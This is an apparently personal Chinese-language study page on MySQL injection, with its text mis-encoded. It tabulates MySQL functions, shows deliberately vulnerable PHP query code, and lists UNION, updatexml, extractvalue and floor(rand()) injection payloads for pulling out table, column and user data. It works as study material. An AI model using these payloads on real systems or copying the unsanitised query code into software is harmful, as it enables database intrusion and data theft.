<!-- build time:Thu Jan 18 2024 13:22:56 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="ä½™æ˜Ÿé…’" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="webæ¸—é€"><link rel="canonical" href="http://example.com/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/"><title>MySQLæ³¨å…¥ - webæ¸—é€ - æ¸—é€æµ‹è¯• | ä½™æ˜Ÿé…’ = ä½™æ˜Ÿé…’ = ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">MySQLæ³¨å…¥</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2023-01-14 15:28:26"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2023-01-14T15:28:26+08:00">2023-01-14</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ä½™æ˜Ÿé…’</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxp31goj20zk0m8qv5.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipey84bjtj20zk0m8hdt.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/APT/" itemprop="item" rel="index" title="åˆ†ç±»äº æ¸—é€æµ‹è¯•"><span itemprop="name">æ¸—é€æµ‹è¯•</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/APT/web%E6%B8%97%E9%80%8F/" itemprop="item" rel="index" title="åˆ†ç±»äº webæ¸—é€"><span itemprop="name">webæ¸—é€</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ä½™æ˜Ÿé…’"><meta itemprop="description" content="ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸, æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ä½™æ˜Ÿé…’"></span><div class="body md" itemprop="articleBody"><h1 id="å¸¸è§ç¬¦å·-å‡½æ•°"><a href="#å¸¸è§ç¬¦å·-å‡½æ•°" class="headerlink" title="å¸¸è§ç¬¦å·&#x2F;å‡½æ•°"></a>å¸¸è§ç¬¦å·&#x2F;å‡½æ•°</h1><p><strong>æ³¨é‡Šç¬¦</strong></p><table><thead><tr><th>æ³¨é‡Šç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td># url ç¼–ç  %23</td><td>å•è¡Œæ³¨é‡Šåœ¨URLä¸­è¡¨ç¤ºé”šç‚¹ï¼Œå°±æ˜¯hashè·¯ç”±ï¼Œå¸¦ä¸Š#ä¸ä¼šè¯·æ±‚åç«¯è·¯ç”±ï¼Œè€Œæ˜¯åˆ·æ–°å‰ç«¯è·¯ç”±</td></tr><tr><td>â€“ x</td><td>å•è¡Œæ³¨é‡Š x è¡¨ç¤ºä»»æ„å­—ç¬¦ï¼Œè¿™é‡Œä¸¤è€…ä¹‹é—´å­˜åœ¨ä¸€ä¸ªç©ºæ ¼</td></tr><tr><td>/**/</td><td>å¤šè¡Œï¼ˆå†…è”ï¼‰æ³¨é‡Š</td></tr></tbody></table><p><strong>å¸¸ç”¨è¿ç®—ç¬¦</strong></p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>åŒ and</td></tr><tr><td>!</td><td>åŒ not</td></tr><tr><td>^</td><td>å¼‚æˆ–ï¼ŒåŒ xor</td></tr><tr><td>\</td><td>è½¬ä¹‰ç¬¦</td></tr><tr><td>~</td><td>ä¸€å…ƒæ¯”ç‰¹åè½¬</td></tr><tr><td>+</td><td>åŠ ï¼Œå¯æ›¿ä»£ç©ºæ ¼</td></tr></tbody></table><p><strong>å¸¸è§å…¨å±€å˜é‡</strong></p><table><thead><tr><th>å˜é‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>@@VERSION</td><td>è¿”å›ç‰ˆæœ¬ä¿¡æ¯</td></tr><tr><td>@@version_compile_os</td><td>æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬</td></tr><tr><td>@@GLOBAL.VERSION</td><td>åŒ @@VERSION</td></tr><tr><td>@@HOSTNAME</td><td>è¿”å›å®‰è£…çš„è®¡ç®—æœºåç§°</td></tr><tr><td>@@BASEDIR</td><td>è¿”å› MYSQL ç»å¯¹è·¯å¾„</td></tr><tr><td>@@secure_file_priv</td><td>æŸ¥çœ‹æœ‰æ— è¯»å†™æƒé™ï¼Œæ— å†…å®¹è¡¨ç¤ºæ— é™åˆ¶ï¼ŒNULLè¡¨ç¤ºç¦æ­¢ï¼Œç›®å½•åè¡¨ç¤ºåªå¯¹è¿™ä¸ªç›®å½•å­˜åœ¨è¯»å†™æƒé™ï¼Œ5.5.53.ç‰ˆæœ¬åéƒ½ä¸ºNULLï¼Œä¹‹å‰æ— å†…å®¹</td></tr></tbody></table><p><strong>ç³»ç»Ÿå‡½æ•°ä¿¡æ¯</strong></p><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>USER()</td><td>è·å–å½“å‰æ“ä½œå¥æŸ„çš„ç”¨æˆ·åï¼ŒåŒ SESSION_USER()ã€CURRENT_USER()ï¼Œæœ‰æ—¶ä¹Ÿç”¨ SYSTEM_USER()ã€‚</td></tr><tr><td>DATABASE()</td><td>è·å–å½“å‰é€‰æ‹©çš„æ•°æ®åº“åï¼ŒåŒ SCHEMA()</td></tr><tr><td>VERSION()</td><td>è·å–å½“å‰ç‰ˆæœ¬ä¿¡æ¯ã€‚</td></tr></tbody></table><p><strong>è¿›åˆ¶è½¬æ¢</strong></p><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ORD(str)</td><td>è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</td></tr><tr><td>OCT(N)</td><td>ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å› N çš„å…«è¿›åˆ¶æ•°ï¼ŒN æ˜¯ä¸€ä¸ª BIGINT å‹æ•°å€¼ï¼Œä½œç”¨ç›¸å½“äº CONV(N,10,8)ã€‚</td></tr><tr><td>HEX(N_S)</td><td>å‚æ•°ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè¿”å› N_or_S çš„ 16 è¿›åˆ¶å­—ç¬¦ä¸²å½¢å¼ï¼Œä¸ºæ•°å­—æ—¶ï¼Œè¿”å›å…¶ 16 è¿›åˆ¶æ•°å½¢å¼ã€‚</td></tr><tr><td>UNHEX(str)</td><td>HEX(str)çš„é€†å‘å‡½æ•°ã€‚å°†å‚æ•°ä¸­çš„æ¯ä¸€å¯¹ 16 è¿›åˆ¶æ•°å­—éƒ½è½¬æ¢ä¸º 10 è¿›åˆ¶æ•°å­—ï¼Œç„¶åå†è½¬æ¢æˆ ASCII ç æ‰€å¯¹åº”çš„å­—ç¬¦ã€‚</td></tr><tr><td>BIN(N)</td><td>è¿”å›åè¿›åˆ¶æ•°å€¼ N çš„äºŒè¿›åˆ¶æ•°å€¼çš„å­—ç¬¦ä¸²è¡¨ç°å½¢å¼ã€‚</td></tr><tr><td>ASCII(str)</td><td>åŒ ORD(string)ã€‚</td></tr><tr><td>CONV(N,from_base,to_base)</td><td>å°†æ•°å€¼å‹å‚æ•° N ç”±åˆå§‹è¿›åˆ¶ from_base è½¬æ¢ä¸ºç›®æ ‡è¿›åˆ¶ to_base çš„å½¢å¼å¹¶è¿”å›ã€‚</td></tr><tr><td>CHAR(N,â€¦ [USING charset_name])</td><td>å°†æ¯ä¸€ä¸ªå‚æ•° N éƒ½è§£é‡Šä¸ºæ•´æ•°ï¼Œè¿”å›ç”±è¿™äº›æ•´æ•°åœ¨ ASCII ç ä¸­æ‰€å¯¹åº”å­—ç¬¦æ‰€ç»„æˆçš„å­—ç¬¦ä¸²ã€‚</td></tr></tbody></table><p><strong>å­—ç¬¦ä¸²æˆªå–&#x2F;æ‹¼æ¥</strong></p><table><thead><tr><th>å‡½æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²è¿›è¡Œæˆªå–ï¼Œä¸º SUBSTRING çš„ç®€å•ç‰ˆã€‚</td></tr><tr><td>SUBSTRING()</td><td>å¤šç§æ ¼å¼ SUBSTRING(str,pos)ã€SUBSTRING(str FROM pos)ã€SUBSTRING(str,pos,len)ã€SUBSTRING(str FROM pos FOR len)ã€‚</td></tr><tr><td>RIGHT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å³è¾¹æˆªå–æŒ‡å®šé•¿åº¦ã€‚</td></tr><tr><td>LEFT(str,len)</td><td>å¯¹æŒ‡å®šå­—ç¬¦ä¸²ä»æœ€å·¦è¾¹æˆªå–æŒ‡å®šé•¿åº¦ã€‚</td></tr><tr><td>RPAD(str,len,padstr)</td><td>åœ¨ str å³æ–¹è¡¥é½ len ä½çš„å­—ç¬¦ä¸² padstrï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ã€‚å¦‚æœ str é•¿åº¦å¤§äº lenï¼Œåˆ™è¿”å›å€¼çš„é•¿åº¦å°†ç¼©å‡åˆ° len æ‰€æŒ‡å®šçš„é•¿åº¦ã€‚</td></tr><tr><td>LPAD(str,len,padstr)</td><td>ä¸ RPAD ç›¸ä¼¼ï¼Œåœ¨ str å·¦è¾¹è¡¥é½ã€‚</td></tr><tr><td>MID(str,pos,len)</td><td>åŒäº SUBSTRING(str,pos,len)ã€‚</td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>åœ¨åŸå§‹å­—ç¬¦ä¸² str ä¸­ï¼Œå°†è‡ªå·¦æ•°ç¬¬ pos ä½å¼€å§‹ï¼Œé•¿åº¦ä¸º len ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ–°å­—ç¬¦ä¸² newstrï¼Œç„¶åè¿”å›ç»è¿‡æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚INSERT(str,len,1,0x0)å¯å½“åšæˆªå–å‡½æ•°ã€‚</td></tr><tr><td>CONCAT(str1,str2â€¦)</td><td>å‡½æ•°ç”¨äºå°†å¤šä¸ªå­—ç¬¦ä¸²åˆå¹¶ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²</td></tr><tr><td>GROUP_CONCAT(â€¦)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆã€‚</td></tr><tr><td>MAKE_SET(bits,str1,str2,â€¦)</td><td>æ ¹æ®å‚æ•° 1ï¼Œè¿”å›æ‰€è¾“å…¥å…¶ä»–çš„å‚æ•°å€¼ã€‚å¯ç”¨ä½œå¸ƒå°”ç›²æ³¨ï¼Œå¦‚ï¼šEXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,â€™1â€™,â€™710â€™))ã€‚</td></tr></tbody></table><p><strong>å…¶ä»–å¸¸è§å‡½æ•°</strong></p><table><thead><tr><th>å‡½æ•°&#x2F;è¯­å¥</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>IF(exp,state1,state2)</td><td>æ¡ä»¶è¯­å¥ï¼Œexp ä¸º trueï¼Œæ‰§è¡Œ state1ï¼Œå¦åˆ™æ‰§è¡Œ state2</td></tr><tr><td>CASEâ€¦WHEN exp THEN state1 ELSE state2 END</td><td>åŒ IF</td></tr><tr><td>SLEEP(N)</td><td>ä¼‘çœ  N ç§’</td></tr><tr><td>BENCHMARK(count,exp)ï¼š</td><td>æ‰§è¡Œè¡¨è¾¾å¼ expï¼Œcount æ¬¡ï¼ˆæ¶ˆè€— CPUï¼‰</td></tr><tr><td>LENGTH(str)</td><td>è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</td></tr><tr><td>PI()</td><td>è¿”å› Ï€ çš„å…·ä½“æ•°å€¼ã€‚</td></tr><tr><td>REGEXP â€œstatementâ€</td><td>æ­£åˆ™åŒ¹é…æ•°æ®ï¼Œè¿”å›å€¼ä¸ºå¸ƒå°”å€¼ã€‚</td></tr><tr><td>LIKE â€œstatementâ€</td><td>åŒ¹é…æ•°æ®ï¼Œ% ä»£è¡¨ä»»æ„å†…å®¹ã€‚è¿”å›å€¼ä¸ºå¸ƒå°”å€¼ã€‚</td></tr><tr><td>RLIKE â€œstatementâ€</td><td>ä¸ regexp ç›¸åŒã€‚</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>è¿”å›å­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</td></tr><tr><td>POSITION(substr IN str)</td><td>ç­‰åŒäº LOCATE()ã€‚</td></tr><tr><td>LOWER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å¤§å†™å­—æ¯å…¨éƒ¨è½¬æˆå°å†™ã€‚åŒï¼šLCASE(str)ã€‚</td></tr><tr><td>UPPER(str)</td><td>å°†å­—ç¬¦ä¸²çš„å°å†™å­—æ¯å…¨éƒ¨è½¬æˆå¤§å†™ã€‚åŒï¼šUCASE(str)ã€‚</td></tr><tr><td>ELT(N,str1,str2,str3,â€¦)</td><td>ä¸ MAKE_SET(bit,str1,str2â€¦)ç±»ä¼¼ï¼Œæ ¹æ® N è¿”å›å‚æ•°å€¼ã€‚</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>è‹¥ expr1 ä¸ expr2 ç›¸åŒï¼Œåˆ™è¿”å› expr1ï¼Œå¦åˆ™è¿”å› NULLã€‚</td></tr><tr><td>CHARSET(str)</td><td>è¿”å›å­—ç¬¦ä¸²ä½¿ç”¨çš„å­—ç¬¦é›†ã€‚</td></tr><tr><td>DECODE(crypt_str,pass_str)</td><td>ä½¿ç”¨ pass_str ä½œä¸ºå¯†ç ï¼Œè§£å¯†åŠ å¯†å­—ç¬¦ä¸² crypt_strã€‚åŠ å¯†å‡½æ•°ï¼šENCODE(str,pass_str)ã€‚</td></tr></tbody></table><h2 id="å¸¸ç”¨è¯­å¥"><a href="#å¸¸ç”¨è¯­å¥" class="headerlink" title="å¸¸ç”¨è¯­å¥"></a>å¸¸ç”¨è¯­å¥</h2><p>è·å–æ•°æ®åº“ç‰ˆæœ¬</p><pre><code class="sql">select version();
</code></pre><p>è·å–å½“å‰ç”¨æˆ·</p><pre><code class="sql">select user()
</code></pre><p>è·å–æ‰€æœ‰æ•°æ®åº“</p><pre><code class="sql">select schema_name from information_schema.schemata;
</code></pre><p>è·å–å½“å‰æ•°æ®åº“</p><pre><code class="sql">select database()
</code></pre><p>è·å–ç”¨æˆ·</p><pre><code class="sql">desc mysql.user
select from mysql.user
</code></pre><p>è·å–å½“å‰æ•°æ®åº“çš„è¡¨å</p><pre><code class="sql">select table_name from information_schema.tables where table_schema = database()
</code></pre><p>è·å–å½“å‰æ•°æ®åº“çš„æŸè¡¨çš„åˆ—å</p><pre><code class="sql">select column_name from information_schema.columns where table_name = &#39;users&#39;
</code></pre><p>è·å–å½“å‰æ•°æ®åº“æŸè¡¨çš„å€¼</p><pre><code class="sql">select id ,username,password from users;
</code></pre><h1 id="æ˜¾é”™æ³¨å…¥"><a href="#æ˜¾é”™æ³¨å…¥" class="headerlink" title="æ˜¾é”™æ³¨å…¥"></a>æ˜¾é”™æ³¨å…¥</h1><p><strong>ä»£ç åˆ†æ</strong></p><pre><code class="php">&lt;?php
  $con = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;test&quot;);
if (mysqli_connect_errno())&#123;
  echo &quot;è¿æ¥å¤±è´¥&quot; . mysqli_connect_errno();
&#125;
$id = $_GET[&#39;id&#39;];
$result = mysqli_query($con, &quot;select * from users where id = &quot; . $id);
$row = mysqli_fetch_array($result);
echo $row[&#39;username&#39;] . &quot;:&quot; . $row[&#39;passwd&#39;];
echo &quot;&lt;br&gt;&quot;
?&gt;
</code></pre><p>å½“è®¿é—®id&#x3D;1æ—¶ï¼Œç¨‹åºæ­£å¸¸æ‰§è¡Œï¼Œé€šè¿‡order byåˆ¤æ–­å®Œå­—æ®µä¸ªæ•°ï¼Œåœ¨id&#x3D;1åé¢åŠ å…¥union select ä¸ªæ•°ï¼ˆ1,2,3,4,â€¦â€¦ï¼‰å°±ä¼šå˜æˆ select * from users where id &#x3D; 1 å’Œ union select ä¸ªæ•°ï¼ˆ1,2,3,4,â€¦â€¦ï¼‰ ä¸¤ä¸ªSQLè¯­å¥</p><h2 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h2><p><strong>åˆ¤æ–­æ³¨å…¥ç‚¹</strong></p><pre><code class="sql">and 1=1
and 1=2
and substring_index(database(),&#39;qwasda&#39;,1)=database()
and substring_index(database(),&#39;qwasda&#39;,1)!=database()
and sleep(5)
&#39; -- 123
&quot; -- 123
&#39;) -- 123
&quot;) -- 123
</code></pre><p><strong>æŸ¥çœ‹è¾“å‡ºç‚¹</strong></p><pre><code class="sql">?id=1&#39; order by n -- 123 // å‘ç°æœ‰5ä¸ªå­—æ®µ
?id=1&#39; union select 1,2,3 -- 123 // å‘ç°ä¸æ˜¾ç¤ºï¼Œè¿™æ˜¯å› ä¸ºunion selectçš„è¯­å¥æ˜¯åŸºäºå‰é¢çš„æ˜¾ç¤ºï¼Œè®©å‰é¢æŠ¥é”™å°±ä¼šæ˜¾ç¤ºåé¢
?id=1.1&#39; union select 1,2,3 -- 123 // å‘ç°æ˜¾ç¤ºå‡ºæ•°å­—2å’Œ3
</code></pre><p><strong>æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯</strong></p><pre><code class="sql">?id=1.1&#39; union select 1,2,database() -- 123     // æŸ¥çœ‹å½“å‰æ•°æ®åº“å
?id=1.1&#39; union select 1,2,user() -- 123         // æŸ¥çœ‹å½“å‰ç”¨æˆ·
?id=1.1&#39; union select 1,2,@@datadir -- 123      // æŸ¥çœ‹æ•°æ®åº“è·¯å¾„
?id=1.1&#39; union select 1,2,@@version_compile_os  // æŸ¥çœ‹æ“ä½œç³»ç»Ÿç‰ˆæœ¬
?id=1.1&#39; union select 1,2,version() -- 123      // æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®è¡¨</strong></p><pre><code class="sql">?id=1.1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- 123
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®å­—æ®µ</strong></p><p>è¦æ³¨æ„è¾“å…¥æ•°æ®è¡¨åæ—¶è¦åŠ ä¸Šå¼•å·æˆ–è€…å°†æ•°æ®è¡¨è¿›è¡Œ16è¿›åˆ¶ç¼–ç [0xâ€¦â€¦]</p><pre><code class="sql">?id=1.1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;æ•°æ®è¡¨å&#39; -- 123 
</code></pre><p><strong>æŸ¥çœ‹æ•°æ®</strong></p><pre><code class="sql">?id=1.1 union select 1,2,group_concat(å­—æ®µå) from æ•°æ®è¡¨ -- 123
</code></pre><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><p><strong>ä»£ç åˆ†æ</strong></p><pre><code class="php">&lt;?php
    $con = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;test&quot;);
    if (mysqli_connect_errno())&#123;
        echo &quot;è¿æ¥å¤±è´¥&quot; . mysqli_connect_errno();
    &#125;
    $username = $_GET[&#39;username&#39;];
    if ($result = mysqli_query($con, &quot;select * from users where &#39;username&#39; =&#39;&quot;. $username . &quot;&#39;&quot;)&#123;
        echo &quot;yes&quot;;
    &#125;else&#123;
        echo mysqli_error($con);
    &#125;
?&gt;
</code></pre><p>è¾“å…¥username&#x3D;1â€™æ—¶ï¼ŒSQLè¯­å¥ä¸ºselect * from users where â€˜usernameâ€™&#x3D;â€™1â€™â€™ï¼Œæ‰§è¡Œæ—¶ä¼šå› ä¸ºå¤šäº†ä¸€ä¸ªå•å¼•å·æŠ¥é”™</p><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h2><blockquote><p>updatexml(ç›®æ ‡xmlå†…å®¹, xmlæ–‡æ¡£è·¯å¾„, æ›´æ–°å†…å®¹)</p></blockquote><p>å®é™…ä¸Šå°±æ˜¯å»æ›´æ–°xmlæ–‡æ¡£ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨xmlæ–‡æ¡£çš„è·¯å¾„çš„ä½ç½®é‡Œå†™å…¥äº†å­æŸ¥è¯¢ï¼Œé€šè¿‡è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œæ–‡æ¡£è·¯å¾„ä¸ç¬¦åˆè§„çŸ©è¿›è¡ŒæŠ¥é”™ï¼ŒæŠ¥é”™çš„æ—¶å€™å°±å·²ç»åœ¨æ‰§è¡Œé‚£ä¸ªå­æŸ¥è¯¢äº†ï¼Œä¸»è¦ç›®çš„æ˜¯è®©xmlæ–‡æ¡£è·¯å¾„æŠ¥é”™ï¼Œxmlå†…å®¹å’Œæ›´æ–°å†…å®¹å¯ä»¥éšä¾¿å†™ï¼Œå¯ä»¥åˆ©ç”¨concatå‡½æ•°å°†å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥èµ·æ¥</p><pre><code class="sql">?id=1&#39; or updatexml(1,concat(0x7e,(æŸ¥è¯¢çš„è¯­å¥),0x7e),1) -- 123
</code></pre><p>è¿™é‡Œçš„æŸ¥è¯¢è¯­å¥å’Œä¸Šé¢æ˜¾é”™æ³¨å…¥çš„è¯­å¥ä¸€æ¨¡ä¸€æ ·ï¼Œé™¤äº†ä¸èƒ½ä½¿ç”¨group_concatå‡½æ•°ä¸€æ¬¡è¾“å‡ºå…¨éƒ¨æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨limitæ¥ä¸€ä¸ªä¸€ä¸ªè¾“å‡º</p><pre><code class="sql">?id=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1) -- 123
</code></pre><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><blockquote><p>extractvalue(ç›®æ ‡xmlæ–‡æ¡£, xmlè·¯å¾„)</p></blockquote><p>å’Œupdatexmlä½œç”¨ä¸€æ ·ï¼Œå°±æ˜¯å‚æ•°ä¸ä¸€æ ·</p><pre><code class="sql">?id=1&#39; or extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) -- 123
</code></pre><h2 id="floor-rand"><a href="#floor-rand" class="headerlink" title="floor+rand"></a>floor+rand</h2><blockquote><p><strong>floor()</strong> : å‘ä¸‹å–æ•´</p><p><strong>rand()</strong> : 0-1ç”Ÿæˆéšæœºæ•°ï¼ˆ*2å°±å˜æˆäº†0-2ç”Ÿæˆéšæœºæ•°ï¼‰[æ ¹æ®å½“å‰æ•°æ®è¡¨ä¸­çš„å­—æ®µæ¥ç”Ÿæˆéšæœºæ•°]</p><p><strong>group by</strong> : ç”¨æ¥ç»™æ•°æ®åˆ†ç»„</p><p><strong>count(*)</strong> : ç”¨æ¥ç»Ÿè®¡ä¸ªæ•°</p></blockquote><p><mark style="background:#FF5582A6">floor(rand()*2)</mark></p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409152543-1692246647203-25.png"><ul><li>å¾ˆæ˜æ˜¾æ˜¯æ²¡æœ‰è§„å¾‹çš„</li></ul><p><mark style="background:#FF5582A6">floor(rand(0)*2)</mark></p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409152603-1692246647203-26.png"><blockquote><p>ä¸ºä»€ä¹ˆrand(0)åå˜çš„æœ‰è§„å¾‹äº†ï¼Ÿ</p><p>å› ä¸ºä½¿ç”¨äº†å›ºå®šçš„éšæœºæ•°ç§å­0ï¼Œæ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°åˆ—éƒ½æ˜¯ç›¸åŒçš„é¡ºåºï¼ˆå½“ç„¶ï¼Œè¿™ä¸ª0ä¹Ÿä¸æ˜¯å›ºå®šçš„ï¼Œä¹Ÿå¯ä»¥å°è¯•å…¶ä»–æ•°å­—ï¼‰</p></blockquote><p><mark style="background:#FF5582A6">group by + count(*)</mark></p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230409152729-1692246647203-27.png"><p><strong>æŠ¥é”™åŸç†</strong></p><p>å½“æŸ¥è¯¢æ—¶ä½¿ç”¨äº†rand()çš„è¯ï¼Œè¯¥å€¼å°±ä¼šè¢«è®¡ç®—å¾ˆå¤šæ¬¡ï¼Œä½¿ç”¨group byçš„æ—¶å€™floor(rand(0)*2)ä¼šè¢«å¤šè®¡ç®—ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯å½“ä½¿ç”¨äº†floor(rand(0)*2)çš„æ—¶å€™è®¡ç®—ä¸€æ¬¡</p><pre><code class="sql">select count(*),concat(floor(rand(0)*2),0x7e,(select version()))a from login group by a;
